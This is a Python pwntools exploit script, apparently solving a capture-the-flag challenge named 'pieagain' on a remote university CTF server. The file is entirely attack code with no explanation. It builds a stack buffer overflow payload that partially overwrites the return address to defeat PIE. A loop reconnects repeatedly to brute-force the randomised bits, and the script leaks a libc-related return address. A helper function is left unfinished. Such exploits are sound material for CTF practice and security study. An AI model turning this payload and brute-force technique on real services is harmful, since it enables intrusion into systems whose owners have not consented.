from pwn import *
from random import choice



def penetrate(io, base, elf):
    rep = 0x2c
    io.sendline('jyh')
    print(io.recvline())
    print(io.recvline())
    write = elf.plt['write']
    payload = b'A'*rep + b'\xDE' + bytes([base*16 + 8])
    print(payload)
    io.sendline(payload)
    print(io.recvline())
    ...


elf = ELF('./pieagain')

# io = remote("pwn1.0ops.sjtu.cn", 10008)

# print(io.recvline())

# io.send(b"A"*31)

rep = 0x2c

# print(io.recvline())

# payload = b'A'*rep + b'\xDE\x08' 

# io.sendline(payload)

# print(io.recvline())


# print(io.recvall())
# exit(1)
while True:
    io = remote("pwn1.0ops.sjtu.cn", 10008)
    io.recvline()
    io.send(b"A"*31)
    io.recvline()
    print(io.recvline())
    b = choice([i for i in range(16)])
    payload = b'A'*rep + b'\xDE\x08' # + bytes([b*16 + 8]) # 0x{b}863 is the start address of rtn
    io.sendline(payload)
    try:
        io.recv(4)
        addr = io.recv(4)
        print(hex(u32(addr))) # return address of main function, which is in _libc_start_main function
        break
    except:
        continue

# penetrate(io, b, elf) 

# io.interactive()